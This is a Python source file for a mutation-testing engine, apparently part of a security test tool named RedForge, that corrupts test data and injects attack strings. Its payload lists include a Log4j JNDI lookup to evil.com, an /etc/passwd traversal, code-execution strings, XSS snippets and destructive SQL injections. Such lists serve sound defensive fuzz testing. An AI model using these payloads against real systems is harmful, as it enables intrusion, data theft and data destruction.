"""
Mutation Testing Engine

Implements mutation testing strategies for RedForge components,
focusing on data corruption, protocol violations, and edge cases.
"""

import random
import json
import struct
import uuid
from datetime import datetime, timedelta
from enum import Enum
from typing import Any, Dict, List, Optional, Union, Callable
from dataclasses import dataclass

class MutationType(Enum):
    """Types of mutations to apply during testing"""
    # Data corruption
    BIT_FLIP = "bit_flip"
    BYTE_CORRUPTION = "byte_corruption"
    ENCODING_CORRUPTION = "encoding_corruption"
    
    # Structure mutations
    FIELD_DELETION = "field_deletion"
    FIELD_DUPLICATION = "field_duplication"
    FIELD_TYPE_CHANGE = "field_type_change"
    NESTED_CORRUPTION = "nested_corruption"
    
    # Value mutations
    BOUNDARY_VALUES = "boundary_values"
    NULL_INJECTION = "null_injection"
    OVERFLOW_VALUES = "overflow_values"
    UNICODE_CORRUPTION = "unicode_corruption"
    
    # Protocol violations
    INVALID_JSON = "invalid_json"
    SCHEMA_VIOLATION = "schema_violation"
    MISSING_REQUIRED = "missing_required"
    
    # Timing mutations
    TIMESTAMP_DRIFT = "timestamp_drift"
    SEQUENCE_CORRUPTION = "sequence_corruption"
    
    # Security mutations
    INJECTION_PAYLOADS = "injection_payloads"
    XSS_PAYLOADS = "xss_payloads"
    SQL_INJECTION = "sql_injection"

@dataclass
class MutationResult:
    """Result of a mutation operation"""
    original_data: Any
    mutated_data: Any
    mutation_type: MutationType
    mutation_points: List[str]
    success: bool
    error: Optional[str] = None
    metadata: Dict[str, Any] = None

class MutationEngine:
    """
    Core mutation testing engine that applies various types of mutations
    to test data resilience and error handling.
    """
    
    def __init__(self, seed: Optional[int] = None):
        self.random = random.Random(seed)
        self.mutation_strategies = {
            MutationType.BIT_FLIP: self._bit_flip_mutation,
            MutationType.BYTE_CORRUPTION: self._byte_corruption_mutation,
            MutationType.ENCODING_CORRUPTION: self._encoding_corruption_mutation,
            MutationType.FIELD_DELETION: self._field_deletion_mutation,
            MutationType.FIELD_DUPLICATION: self._field_duplication_mutation,
            MutationType.FIELD_TYPE_CHANGE: self._field_type_change_mutation,
            MutationType.NESTED_CORRUPTION: self._nested_corruption_mutation,
            MutationType.BOUNDARY_VALUES: self._boundary_values_mutation,
            MutationType.NULL_INJECTION: self._null_injection_mutation,
            MutationType.OVERFLOW_VALUES: self._overflow_values_mutation,
            MutationType.UNICODE_CORRUPTION: self._unicode_corruption_mutation,
            MutationType.INVALID_JSON: self._invalid_json_mutation,
            MutationType.SCHEMA_VIOLATION: self._schema_violation_mutation,
            MutationType.MISSING_REQUIRED: self._missing_required_mutation,
            MutationType.TIMESTAMP_DRIFT: self._timestamp_drift_mutation,
            MutationType.SEQUENCE_CORRUPTION: self._sequence_corruption_mutation,
            MutationType.INJECTION_PAYLOADS: self._injection_payloads_mutation,
            MutationType.XSS_PAYLOADS: self._xss_payloads_mutation,
            MutationType.SQL_INJECTION: self._sql_injection_mutation,
        }
        
        # Common injection payloads for security testing
        self.injection_payloads = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "{{7*7}}",  # Template injection
            "${jndi:ldap://evil.com/x}",  # Log4j
            "../../../etc/passwd",  # Path traversal
            "{{constructor.constructor('return process')().exit()}}",  # Node.js
            "eval(compile('for x in range(1):\\n import os\\n os.system(\"ls\")', 'a', 'exec'))",  # Python
        ]
        
        # Unicode corruption patterns
        self.unicode_corruption = [
            "\x00",  # Null byte
            "\ufeff",  # BOM
            "\u202e",  # Right-to-left override
            "\u2028",  # Line separator
            "\u2029",  # Paragraph separator
            "💀🔥",  # Emoji
            "ßÄÖÜäöü",  # German chars
            "中文测试",  # Chinese chars
            "العربية",  # Arabic
        ]
    
    def mutate(self, data: Any, mutation_types: Optional[List[MutationType]] = None, 
               mutation_rate: float = 0.1) -> MutationResult:
        """
        Apply mutations to the given data.
        
        Args:
            data: Data to mutate
            mutation_types: Types of mutations to apply (random selection if None)
            mutation_rate: Probability of applying mutations (0.0-1.0)
            
        Returns:
            MutationResult with original and mutated data
        """
        if mutation_types is None:
            mutation_types = list(MutationType)
        
        # Randomly select mutation type
        mutation_type = self.random.choice(mutation_types)
        
        # Skip mutation based on rate
        if self.random.random() > mutation_rate:
            return MutationResult(
                original_data=data,
                mutated_data=data,
                mutation_type=mutation_type,
                mutation_points=[],
                success=True
            )
        
        try:
            strategy = self.mutation_strategies[mutation_type]
            mutated_data, mutation_points = strategy(data)
            
            return MutationResult(
                original_data=data,
                mutated_data=mutated_data,
                mutation_type=mutation_type,
                mutation_points=mutation_points,
                success=True,
                metadata={"mutation_rate": mutation_rate}
            )
            
        except Exception as e:
            return MutationResult(
                original_data=data,
                mutated_data=data,
                mutation_type=mutation_type,
                mutation_points=[],
                success=False,
                error=str(e)
            )
    
    def _bit_flip_mutation(self, data: Any) -> tuple[Any, List[str]]:
        """Flip random bits in binary representation"""
        if isinstance(data, str):
            data_bytes = data.encode('utf-8')
            if not data_bytes:
                return data, []
            
            # Flip random bit
            byte_index = self.random.randint(0, len(data_bytes) - 1)
            bit_index = self.random.randint(0, 7)
            
            byte_array = bytearray(data_bytes)
            byte_array[byte_index] ^= (1 << bit_index)
            
            try:
                mutated = byte_array.decode('utf-8', errors='replace')
                return mutated, [f"bit_flip_byte_{byte_index}_bit_{bit_index}"]
            except:
                return data, []
        
        elif isinstance(data, (int, float)):
            # Pack as bytes, flip bit, unpack
            if isinstance(data, int):
                packed = struct.pack('q', data)  # 64-bit signed int
                format_char = 'q'
            else:
                packed = struct.pack('d', data)  # 64-bit double
                format_char = 'd'
            
            byte_index = self.random.randint(0, len(packed) - 1)
            bit_index = self.random.randint(0, 7)
            
            byte_array = bytearray(packed)
            byte_array[byte_index] ^= (1 << bit_index)
            
            try:
                mutated = struct.unpack(format_char, byte_array)[0]
                return mutated, [f"bit_flip_numeric_{byte_index}_{bit_index}"]
            except:
                return data, []
        
        return data, []
    
    def _byte_corruption_mutation(self, data: Any) -> tuple[Any, List[str]]:
        """Corrupt random bytes in data"""
        if isinstance(data, str):
            if not data:
                return data, []
            
            # Corrupt random character
            index = self.random.randint(0, len(data) - 1)
            chars = list(data)
            chars[index] = chr(self.random.randint(0, 255))
            return ''.join(chars), [f"byte_corruption_{index}"]
        
        return data, []
    
    def _encoding_corruption_mutation(self, data: Any) -> tuple[Any, List[str]]:
        """Introduce encoding issues"""
        if isinstance(data, str):
            # Add Unicode corruption
            corruption = self.random.choice(self.unicode_corruption)
            insertion_point = self.random.randint(0, len(data))
            mutated = data[:insertion_point] + corruption + data[insertion_point:]
            return mutated, [f"encoding_corruption_{insertion_point}"]
        
        return data, []
    
    def _field_deletion_mutation(self, data: Any) -> tuple[Any, List[str]]:
        """Delete random fields from objects"""
        if isinstance(data, dict) and data:
            mutated = data.copy()
            field_to_delete = self.random.choice(list(data.keys()))
            del mutated[field_to_delete]
            return mutated, [f"deleted_field_{field_to_delete}"]
        
        elif isinstance(data, list) and data:
            mutated = data.copy()
            index_to_delete = self.random.randint(0, len(data) - 1)
            del mutated[index_to_delete]
            return mutated, [f"deleted_index_{index_to_delete}"]
        
        return data, []
    
    def _field_duplication_mutation(self, data: Any) -> tuple[Any, List[str]]:
        """Duplicate random fields"""
        if isinstance(data, dict) and data:
            mutated = data.copy()
            field_to_duplicate = self.random.choice(list(data.keys()))
            new_field = f"{field_to_duplicate}_duplicate_{self.random.randint(1000, 9999)}"
            mutated[new_field] = data[field_to_duplicate]
            return mutated, [f"duplicated_field_{field_to_duplicate}"]
        
        elif isinstance(data, list):
            mutated = data.copy()
            if data:
                item_to_duplicate = self.random.choice(data)
                insertion_point = self.random.randint(0, len(mutated))
                mutated.insert(insertion_point, item_to_duplicate)
                return mutated, [f"duplicated_item_{insertion_point}"]
        
        return data, []
    
    def _field_type_change_mutation(self, data: Any) -> tuple[Any, List[str]]:
        """Change field types unexpectedly"""
        if isinstance(data, dict):
            mutated = data.copy()
            if data:
                field_to_change = self.random.choice(list(data.keys()))
                original_value = data[field_to_change]
                
                # Type conversion mutations
                type_mutations = []
                if isinstance(original_value, str):
                    type_mutations = [None, [], {}, 0, True]
                elif isinstance(original_value, (int, float)):
                    type_mutations = [str(original_value), [], {}, None]
                elif isinstance(original_value, bool):
                    type_mutations = [int(original_value), str(original_value), None]
                elif isinstance(original_value, list):
                    type_mutations = [str(original_value), len(original_value), None]
                elif isinstance(original_value, dict):
                    type_mutations = [str(original_value), list(original_value.keys()), None]
                
                if type_mutations:
                    mutated[field_to_change] = self.random.choice(type_mutations)
                    return mutated, [f"type_change_{field_to_change}"]
        
        return data, []
    
    def _nested_corruption_mutation(self, data: Any) -> tuple[Any, List[str]]:
        """Corrupt nested structures"""
        if isinstance(data, dict):
            # Find nested structures
            nested_fields = [k for k, v in data.items() if isinstance(v, (dict, list))]
            if nested_fields:
                field = self.random.choice(nested_fields)
                mutated = data.copy()
                # Recursively mutate nested structure
                nested_result = self.mutate(data[field], mutation_rate=0.8)
                mutated[field] = nested_result.mutated_data
                return mutated, [f"nested_corruption_{field}"]
        
        return data, []
    
    def _boundary_values_mutation(self, data: Any) -> tuple[Any, List[str]]:
        """Inject boundary values"""
        if isinstance(data, dict):
            mutated = data.copy()
            if data:
                field = self.random.choice(list(data.keys()))
                
                boundary_values = [
                    -1, 0, 1,  # Integer boundaries
                    2**31 - 1, -2**31,  # 32-bit boundaries
                    2**63 - 1, -2**63,  # 64-bit boundaries
                    float('inf'), float('-inf'), float('nan'),  # Float boundaries
                    "", " ", "\n", "\t",  # String boundaries
                    "A" * 10000,  # Long string
                ]
                
                mutated[field] = self.random.choice(boundary_values)
                return mutated, [f"boundary_value_{field}"]
        
        return data, []
    
    def _null_injection_mutation(self, data: Any) -> tuple[Any, List[str]]:
        """Inject null values"""
        if isinstance(data, dict) and data:
            mutated = data.copy()
            field = self.random.choice(list(data.keys()))
            mutated[field] = None
            return mutated, [f"null_injection_{field}"]
        
        elif isinstance(data, list) and data:
            mutated = data.copy()
            index = self.random.randint(0, len(data) - 1)
            mutated[index] = None
            return mutated, [f"null_injection_index_{index}"]
        
        return data, []
    
    def _overflow_values_mutation(self, data: Any) -> tuple[Any, List[str]]:
        """Inject overflow values"""
        if isinstance(data, dict) and data:
            mutated = data.copy()
            field = self.random.choice(list(data.keys()))
            
            overflow_values = [
                "A" * 1000000,  # Huge string
                list(range(100000)),  # Huge list
                {f"key_{i}": f"value_{i}" for i in range(10000)},  # Huge dict
                10**100,  # Huge number
                "🚀" * 10000,  # Unicode overflow
            ]
            
            mutated[field] = self.random.choice(overflow_values)
            return mutated, [f"overflow_value_{field}"]
        
        return data, []
    
    def _unicode_corruption_mutation(self, data: Any) -> tuple[Any, List[str]]:
        """Inject problematic Unicode"""
        if isinstance(data, str):
            corruption = self.random.choice(self.unicode_corruption)
            # Insert at random position
            pos = self.random.randint(0, len(data))
            mutated = data[:pos] + corruption + data[pos:]
            return mutated, [f"unicode_corruption_{pos}"]
        
        elif isinstance(data, dict) and data:
            mutated = data.copy()
            field = self.random.choice(list(data.keys()))
            if isinstance(data[field], str):
                corruption = self.random.choice(self.unicode_corruption)
                mutated[field] = str(data[field]) + corruption
                return mutated, [f"unicode_corruption_field_{field}"]
        
        return data, []
    
    def _invalid_json_mutation(self, data: Any) -> tuple[Any, List[str]]:
        """Create invalid JSON structures"""
        if isinstance(data, dict):
            # Convert to JSON string and corrupt it
            json_str = json.dumps(data)
            
            # Common JSON corruption patterns
            corruptions = [
                lambda s: s.replace(',', ',,'),  # Double commas
                lambda s: s.replace('{', '{{'),  # Double braces
                lambda s: s.replace('"', "'"),   # Wrong quotes
                lambda s: s.replace(':', '::'),  # Double colons
                lambda s: s[:-1],                # Missing closing brace
                lambda s: s + ',',               # Trailing comma
                lambda s: s.replace('true', 'True'),  # Wrong boolean
                lambda s: s.replace('null', 'None'),  # Wrong null
            ]
            
            corruption_func = self.random.choice(corruptions)
            corrupted_json = corruption_func(json_str)
            
            return corrupted_json, ["invalid_json_structure"]
        
        return data, []
    
    def _schema_violation_mutation(self, data: Any) -> tuple[Any, List[str]]:
        """Violate expected schema"""
        if isinstance(data, dict):
            mutated = data.copy()
            
            # Add unexpected fields
            unexpected_fields = [
                "__proto__", "constructor", "prototype",  # Prototype pollution
                "eval", "exec", "system",  # Code execution
                "admin", "password", "secret",  # Sensitive fields
                "1" * 100, "A" * 100,  # Long field names
            ]
            
            field_name = self.random.choice(unexpected_fields)
            mutated[field_name] = "unexpected_value"
            
            return mutated, [f"schema_violation_{field_name}"]
        
        return data, []
    
    def _missing_required_mutation(self, data: Any) -> tuple[Any, List[str]]:
        """Remove commonly required fields"""
        if isinstance(data, dict) and data:
            # Common required field names
            required_fields = [
                "id", "uuid", "timestamp", "type", "version",
                "name", "email", "user_id", "session_id",
                "request_id", "trace_id", "span_id"
            ]
            
            mutated = data.copy()
            mutations = []
            
            for field in required_fields:
                if field in mutated:
                    del mutated[field]
                    mutations.append(f"removed_required_{field}")
            
            if mutations:
                return mutated, mutations
        
        return data, []
    
    def _timestamp_drift_mutation(self, data: Any) -> tuple[Any, List[str]]:
        """Corrupt timestamp fields"""
        if isinstance(data, dict):
            mutated = data.copy()
            timestamp_fields = []
            
            # Find timestamp-like fields
            for key, value in data.items():
                if any(ts_indicator in key.lower() for ts_indicator in 
                      ['time', 'date', 'created', 'updated', 'timestamp']):
                    timestamp_fields.append(key)
            
            if timestamp_fields:
                field = self.random.choice(timestamp_fields)
                
                # Timestamp corruption strategies
                corruptions = [
                    "2038-01-19T03:14:07Z",  # Year 2038 problem
                    "1970-01-01T00:00:00Z",  # Unix epoch
                    "9999-12-31T23:59:59Z",  # Far future
                    "invalid-timestamp",      # Invalid format
                    "-1",                     # Negative timestamp
                    str(2**63 - 1),          # Max 64-bit int
                ]
                
                mutated[field] = self.random.choice(corruptions)
                return mutated, [f"timestamp_drift_{field}"]
        
        return data, []
    
    def _sequence_corruption_mutation(self, data: Any) -> tuple[Any, List[str]]:
        """Corrupt sequence numbers and ordering"""
        if isinstance(data, list):
            mutated = data.copy()
            if len(mutated) > 1:
                # Shuffle order
                indices = list(range(len(mutated)))
                self.random.shuffle(indices)
                mutated = [mutated[i] for i in indices]
                return mutated, ["sequence_shuffled"]
        
        elif isinstance(data, dict):
            # Look for sequence-like fields
            seq_fields = [k for k in data.keys() if any(seq in k.lower() 
                         for seq in ['seq', 'order', 'index', 'position'])]
            
            if seq_fields:
                mutated = data.copy()
                field = self.random.choice(seq_fields)
                # Corrupt sequence number
                if isinstance(data[field], int):
                    mutated[field] = -1  # Invalid sequence
                    return mutated, [f"sequence_corruption_{field}"]
        
        return data, []
    
    def _injection_payloads_mutation(self, data: Any) -> tuple[Any, List[str]]:
        """Inject various attack payloads"""
        if isinstance(data, dict) and data:
            mutated = data.copy()
            field = self.random.choice(list(data.keys()))
            payload = self.random.choice(self.injection_payloads)
            
            # Inject into string fields
            if isinstance(data[field], str):
                mutated[field] = data[field] + payload
            else:
                mutated[field] = payload
                
            return mutated, [f"injection_payload_{field}"]
        
        return data, []
    
    def _xss_payloads_mutation(self, data: Any) -> tuple[Any, List[str]]:
        """Inject XSS payloads"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//",
            "<iframe src=javascript:alert('XSS')></iframe>",
        ]
        
        if isinstance(data, dict) and data:
            mutated = data.copy()
            field = self.random.choice(list(data.keys()))
            payload = self.random.choice(xss_payloads)
            mutated[field] = payload
            return mutated, [f"xss_payload_{field}"]
        
        return data, []
    
    def _sql_injection_mutation(self, data: Any) -> tuple[Any, List[str]]:
        """Inject SQL injection payloads"""
        sql_payloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "'; DELETE FROM users WHERE '1'='1",
            "' UNION SELECT * FROM sensitive_data --",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --",
            "' OR 1=1 --",
            "admin'--",
            "' OR 'x'='x",
        ]
        
        if isinstance(data, dict) and data:
            mutated = data.copy()
            field = self.random.choice(list(data.keys()))
            payload = self.random.choice(sql_payloads)
            mutated[field] = payload
            return mutated, [f"sql_injection_{field}"]
        
        return data, []

class TargetedMutationEngine(MutationEngine):
    """
    Targeted mutation engine that focuses on specific fields or patterns
    commonly found in LLM security testing scenarios.
    """
    
    def __init__(self, seed: Optional[int] = None):
        super().__init__(seed)
        
        # LLM-specific field targets
        self.llm_target_fields = [
            "prompt", "response", "model", "tokens", "temperature",
            "max_tokens", "system_message", "user_message", "assistant_message",
            "conversation", "chat_history", "context", "instructions"
        ]
        
        # Security-critical fields
        self.security_fields = [
            "api_key", "token", "secret", "password", "auth", "authorization",
            "user_id", "session_id", "tenant_id", "role", "permissions"
        ]
    
    def targeted_mutate(self, data: Any, target_fields: Optional[List[str]] = None) -> MutationResult:
        """
        Apply targeted mutations to specific fields.
        
        Args:
            data: Data to mutate
            target_fields: Specific fields to target (uses LLM fields if None)
            
        Returns:
            MutationResult with targeted mutations
        """
        if target_fields is None:
            target_fields = self.llm_target_fields
        
        if not isinstance(data, dict):
            return self.mutate(data)
        
        # Find target fields in data
        available_targets = [field for field in target_fields if field in data]
        
        if not available_targets:
            # Fallback to general mutation
            return self.mutate(data)
        
        # Focus mutations on target fields
        mutated = data.copy()
        mutations = []
        
        for target_field in available_targets:
            if self.random.random() < 0.3:  # 30% chance per field
                field_result = self.mutate(data[target_field], mutation_rate=0.8)
                mutated[target_field] = field_result.mutated_data
                mutations.extend([f"{target_field}_{mp}" for mp in field_result.mutation_points])
        
        return MutationResult(
            original_data=data,
            mutated_data=mutated,
            mutation_type=MutationType.NESTED_CORRUPTION,
            mutation_points=mutations,
            success=True,
            metadata={"targeted_fields": available_targets}
        )